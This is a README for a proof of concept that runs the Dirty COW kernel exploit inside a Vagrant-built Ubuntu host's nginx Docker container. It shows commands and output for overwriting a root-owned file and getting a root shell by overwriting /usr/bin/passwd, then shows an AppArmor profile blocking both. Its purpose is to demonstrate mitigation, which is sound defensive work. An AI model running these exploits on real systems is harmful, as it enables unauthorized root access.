# Dirtyc0w Docker POC

```
Prerequisites:
- Vagrant installed

```

## What the POC entails and why

First let's start with the why ? This POC is going to use the [`dirtyc0w`](https://dirtycow.ninja/) kernel [`exploit`](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs) to do privilege escalation inside the standard [`nginx`](https://hub.docker.com/_/nginx/) image. The only modifications
to the image I made is added a non root user lovingly called hacker to the exploit files. To see the make up of the image please see the [`Dockerfile`](https://github.com/scotty-c/dirty-cow-poc/blob/master/dirtyc0w/Dockerfile). Now for the most important part of the POC, how to mitigate the attack without patching with an [`AppArmor`](https://docs.docker.com/engine/security/apparmor/) profile. Showing the importance of correct container security. With a modified version of the exploit I have been able to escape the container. I did not want to open source this as it is malicious, but the same AppArmor profile was also able to mitigate that vulnerability without any changes.  

To build the environment we will build a Vagrant box that is running a Ubuntu 16.04 server, with kernel version 4.4.0-21-generic.This is to mimic a normal server running in either a cloud environment or bare metal.
On the server we will install the latest version of Docker (1.12.3) and set the daemon with the following configuration ` -H tcp://127.0.0.1:4243 -H unix:///var/run/docker.sock --ip-forward=true --iptables=true --ip-masq=true\">>/etc/default/docker` These are some default security settings that make sure the daemon is not accessible outside the host etc. Then we copy the [`AppArmor profile`](https://github.com/scotty-c/dirty-cow-poc/blob/master/nginx-docker) to the host OS in the following location `/etc/apparmor.d/containers/docker-nginx` We will run `apparmor_parser ` to make sure we have a valid profile. We will then build the image with a standard Docker build command `docker build -t scottyc/dirtyc0w .` Then run up our container first container without AppArmor with the following command `docker run -p 80:80 -d --name nginx scottyc/dirtyc0w` we will then run the exploits with the user hacker we created in the Docker image and we will firstly write to a file root owns as the user hacker then we will gain root access. We will then kill that container and from the very same image we will spawn a second container using the following command `docker run --security-opt "apparmor=docker-nginx" -p 80:80 -d --name nginx scottyc/dirtyc0w`. This time we will apply our AppArmor profile that will stop the exploits from working. 

# How to use

To make this as simple as possible I have automated most of the heavy lifting leaving the user to run only a few command. To run the POC please follow the follwoing instructions. 

Firstly 
``
git clone xxxx && cd xxxx
``
Then run up the environment with the command
```
vagrant up
```
Once the server is built, we will ssh into it
```
vagrant ssh
```
change to the root user
```
sudo -i
```
The first container should be running as part of the build process, we can check this with
```
docker ps
```
You should get something like
```
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                         NAMES
db86f1c04483        scottyc/dirtyc0w    "nginx -g 'daemon off"   22 seconds ago      Up 19 seconds       0.0.0.0:80->80/tcp, 443/tcp   nginx
```
Now we can log on as the hacker 
```
docker exec -it -u hacker nginx bash
```
In the directory we are logged into we have the following files
```
drwxrwxrwt  2 root root  4096 Nov  7 11:10 .
drwxr-xr-x 41 root root  4096 Nov  7 11:10 ..
-rwxr-xr-x  1 root root 11496 Nov  7 04:52 cowroot
-rwxr-xr-x  1 root root  9880 Nov  7 04:52 dirtyc0w
-r-----r--  1 root root    32 Nov  7 02:28 foo
```
If we cat the file `foo` we see
```
this content is created by root
```
We will now exploit the file `foo`
```
./dirtyc0w foo hacker-was-here
```
It will print out the following to the terminal
```
mmap 7fd0facf4000

madvise 0

procselfmem 1500000000
```
Then we will cat `foo` again
```
hacker-was-here created by root
```
check the permissions again
```
drwxrwxrwt  2 root root  4096 Nov  7 11:10 .
drwxr-xr-x 41 root root  4096 Nov  7 11:10 ..
-rwxr-xr-x  1 root root 11496 Nov  7 04:52 cowroot
-rwxr-xr-x  1 root root  9880 Nov  7 04:52 dirtyc0w
-r-----r--  1 root root    32 Nov  7 02:28 foo
```

The permissions have not changed. Now let's gain root access 
```
./cowroot
```
It will print the following 
```
DirtyCow root privilege escalation
Backing up /usr/bin/passwd to /tmp/bak
Size of binary: 54192
Racing, this may take a while..
thread stopped
thread stopped
/usr/bin/passwd overwritten
Popping root shell.
Don't forget to restore /tmp/bak
```

You will have root access to the container

Now exit the container with `exit` and `exit` again. Then remove it with `docker rm -f nginx`

Now let's run our secure container
```
docker run --security-opt "apparmor=docker-nginx" -p 80:80 -d --name nginx scottyc/dirtyc0w
```
again we will run
```
docker exec -it -u hacker nginx bash
```
Then run the exploits `./dirtyc0w foo hacker-was-here` and `./cowroot` The files will run but no exploits. For fun try to `ping 8.8.8.8` 


# Clean Up

Exit back to your host machines terminal and issue `vagrant destroy`
